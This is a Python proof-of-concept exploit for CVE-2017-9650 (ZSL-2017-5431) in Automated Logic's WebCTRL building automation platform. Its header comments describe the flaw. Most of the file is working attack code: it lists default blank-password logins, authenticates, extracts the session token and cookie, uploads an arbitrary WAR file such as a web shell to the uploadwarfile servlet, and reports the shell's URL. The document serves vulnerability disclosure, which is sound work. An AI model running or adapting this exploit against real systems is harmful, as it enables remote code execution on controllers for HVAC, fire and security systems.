# -*- coding: utf8 -*-
#
#
# Automated Logic WebCTRL 6.5 Unrestricted File Upload Remote Code Execution
#
#
# Vendor: Automated Logic Corporation
# Product web page: http://www.automatedlogic.com
# Affected version: ALC WebCTRL, i-Vu, SiteScan Web 6.5 and prior
#                   ALC WebCTRL, SiteScan Web 6.1 and prior
#                   ALC WebCTRL, i-Vu 6.0 and prior
#                   ALC WebCTRL, i-Vu, SiteScan Web 5.5 and prior
#                   ALC WebCTRL, i-Vu, SiteScan Web 5.2 and prior
#
# Summary: WebCTRLA(r), Automated Logic&#039;s web-based building automation
# system, is known for its intuitive user interface and powerful integration
# capabilities. It allows building operators to optimize and manage
# all of their building systems - including HVAC, lighting, fire, elevators,
# and security - all within a single HVAC controls platform. It&#039;s everything
# they need to keep occupants comfortable, manage energy conservation measures,
# identify key operational problems, and validate the results.
#
# Desc: WebCTRL suffers from an authenticated arbitrary code execution
# vulnerability. The issue is caused due to the improper verification
# when uploading Add-on (.addons or .war) files using the uploadwarfile
# servlet. This can be exploited to execute arbitrary code by uploading
# a malicious web archive file that will run automatically and can be
# accessed from within the webroot directory. Additionaly, an improper
# authorization access control occurs when using the &#039;anonymous&#039; user.
# By specification, the anonymous user should not have permissions or
# authorization to upload or install add-ons. In this case, when using
# the anonymous user, an attacker is still able to upload a malicious
# file via insecure direct object reference and execute arbitrary code.
# The anonymous user was removed from version 6.5 of WebCTRL.
#
# Tested on: Microsoft Windows 7 Professional (6.1.7601 Service Pack 1 Build 7601)
#            Apache-Coyote/1.1
#            Apache Tomcat/7.0.42
#            CJServer/1.1
#            Java/1.7.0_25-b17
#            Java HotSpot Server VM 23.25-b01
#            Ant 1.7.0
#            Axis 1.4
#            Trove 2.0.2
#            Xalan Java 2.4.1
#            Xerces-J 2.6.1
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2017-5431
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5431.php
#
# ICS-CERT: https://ics-cert.us-cert.gov/advisories/ICSA-17-234-01
# CVE ID: CVE-2017-9650
# CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9650
#
#
# 30.01.2017
#
#

import itertools
import mimetools
import mimetypes
import cookielib
import binascii
import urllib2
import urllib
import sys
import re
import os

from urllib2 import URLError
global bindata

__author__ = &#039;lqwrm&#039;

piton = os.path.basename(sys.argv[0])

def bannerche():
  print &#039;&#039;&#039;
 @-------------------------------------------------@
 |                                                 |
 |        WebCTRL 6.5 Authenticated RCE PoC        |
 |               ID: ZSL-2017-5431                 |
 |       Copyleft (c) 2017, Zero Science Lab       |
 |                                                 |
 @-------------------------------------------------@
          &#039;&#039;&#039;
  if len(sys.argv) < 3:
    print &#039;[+] Usage: &#039;+piton+&#039; <IP> <WAR FILE>&#039;
    print &#039;[+] Example: &#039;+piton+&#039; 10.0.0.17 webshell.war\n&#039;
    sys.exit()

bannerche()

host = sys.argv[1]
filename = sys.argv[2]

with open(filename, &#039;rb&#039;) as f:
    content = f.read()
hexo = binascii.hexlify(content)
bindata = binascii.unhexlify(hexo)

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)

print &#039;[+] Probing target http://&#039;+host

try:
  checkhost = opener.open(&#039;http://&#039;+host+&#039;/index.jsp?operatorlocale=en&#039;)
except urllib2.HTTPError, errorzio:
  if errorzio.code == 404:
    print &#039;[!] Error 001:&#039;
    print &#039;[-] Check your target!&#039;
    print
    sys.exit()
except URLError, errorziocvaj:
  if errorziocvaj.reason:
    print &#039;[!] Error 002:&#039;
    print &#039;[-] Check your target!&#039;
    print
    sys.exit()

print &#039;[+] Target seems OK.&#039;
print &#039;[+] Login please:&#039;

print &#039;&#039;&#039;
Default username: Administrator, Anonymous
Default password: (blank), (blank)
&#039;&#039;&#039;

username = raw_input(&#039;[*] Enter username: &#039;)
password = raw_input(&#039;[*] Enter password: &#039;)

login_data = urllib.urlencode({&#039;pass&#039;:password, &#039;name&#039;:username, &#039;touchscr&#039;:&#039;false&#039;})

opener.addheaders = [(&#039;User-agent&#039;, &#039;Thrizilla/33.9&#039;)]
login = opener.open(&#039;http://&#039;+host+&#039;/?language=en&#039;, login_data)
auth = login.read()

if re.search(r&#039;productName = \&#039;WebCTRL&#039;, auth):
  print &#039;[+] Authenticated!&#039;
  token = re.search(&#039;wbs=(.+?)&&#039;, auth).group(1)
  print &#039;[+] Got wbs token: &#039;+token
  cookie1, cookie2 = [str(c) for c in cj]
  cookie = cookie1[8:51]
  print &#039;[+] Got cookie: &#039;+cookie
else:
  print &#039;[-] Incorrect username or password.&#039;
  print
  sys.exit()

print &#039;[+] Sending payload.&#039;

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return &#039;multipart/form-data; boundary=%s&#039; % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = &#039;--&#039; + self.boundary
        
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"&#039; % name,
              &#039;&#039;,
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: file; name="%s"; filename="%s"&#039; % \
                 (field_name, filename),
              &#039;Content-Type: %s&#039; % content_type,
              &#039;&#039;,
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append(&#039;--&#039; + self.boundary + &#039;--&#039;)
        flattened.append(&#039;&#039;)
        return &#039;\r\n&#039;.join(flattened)

if __name__ == &#039;__main__&#039;:
    form = MultiPartForm()
    form.add_field(&#039;wbs&#039;, token)
    form.add_field(&#039;file"; filename="&#039;+filename, bindata)
    request = urllib2.Request(&#039;http://&#039;+host+&#039;/_common/servlet/lvl5/uploadwarfile&#039;)
    request.add_header(&#039;User-agent&#039;, &#039;SCADA/8.0&#039;)
    body = str(form)
    request.add_header(&#039;Content-type&#039;, form.get_content_type())
    request.add_header(&#039;Cookie&#039;, cookie)
    request.add_header(&#039;Content-length&#039;, len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()

print &#039;[+] Payload uploaded.&#039;
print &#039;[+] Shell available at: http://&#039;+host+&#039;/&#039;+filename[:-4]
print

sys.exit()

